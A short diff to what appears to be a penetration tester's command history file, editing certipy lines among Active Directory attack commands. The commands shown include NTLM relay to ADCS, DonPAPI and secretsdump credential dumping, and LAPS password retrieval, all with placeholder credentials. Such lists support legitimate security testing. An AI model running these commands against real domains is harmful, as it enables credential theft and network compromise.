@@ -307,8 +307,6 @@ pywsus.py --host 192.168.56.1 --port 8530 --executable /opt/resources/windows/sy
 DonPAPI.py breaking.bad/someadmin:somepassword@sometarget
 webclientservicescanner -dc-ip dc01.domain.local domain.local/user:password@dc01.domain.local
 ntlmrelayx -t http://pki.domain.local/certsrv/certfnsh.asp --adcs
-certipy 'domain.local'/'user':'password'@'domaincontroller' -dc-ip 'domaincontroller' auto -scheme ldap -user 'administrator'
-certipy 'domain.local'/'user':'password'@'domaincontroller' -dc-ip 'domaincontroller' find -scheme ldap -vulnerable
 echo '8.8.8.8' | hakrevdns
 prips 192.168.0.0 192.168.0.255
 prips -i4 192.168.0.10 192.168.0.250
@@ -337,4 +335,5 @@ reg.py 'domain.local/backup_operator:somepassword@192.168.56.101' backup -o '\\1
 secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
 pyLAPS.py --action get -d 'domain.local' -u 'someuser' -p 'somepassword' --dc-ip 192.168.56.101
 FindUncommonShares.py -d 'domain.local' -u 'someuser' -p 'somepassword' --dc-ip 192.168.56.101
+certipy find -dc-ip 'domaincontroller' -scheme ldap 'domain.local'/'user':'password'@'domaincontroller'
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
